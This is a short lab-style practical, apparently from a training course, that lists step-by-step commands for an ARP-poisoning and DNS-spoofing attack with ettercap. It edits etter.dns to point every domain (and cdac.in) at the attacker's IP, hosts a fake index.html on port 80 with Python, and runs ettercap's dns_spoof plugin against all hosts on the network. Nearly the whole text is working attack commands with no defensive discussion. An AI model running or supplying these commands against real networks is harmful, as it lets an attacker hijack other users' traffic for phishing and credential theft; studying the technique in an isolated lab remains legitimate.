ARP + DNS spoofing 
In this practical using ARP and DNS we do following steps:
1)we create one directory
$ sudo mkdir hacker
2)Go to that Directory
$ cd hacker 
3) create A record of DNS 
$ sudo vim /etc/ettercap/etter.dns
*    A    192.168.206.137 
cdac.in    A    192.168.206.137 
.cdac.in    A    192.168.206.137 
4) Create an index.html file in that add any text
$ sudo vim index.html 
5) Check ant website is runnung on 80 port
$ lsof -i:80    
6) we host our index.html website 
$ python3 -m http.server --bind 192.168.206.137 80
7) After that just dns spoofing we used this command
 $ sudo ettercap -TqM ARP /// /// -P dns_spoof
 $ sudo ettercap -i eth0 -TqM ARP /// /// -P dns_spoof (Optional)
8) Then check any domain is resolving our website or not
 for eg:http://xyz.com
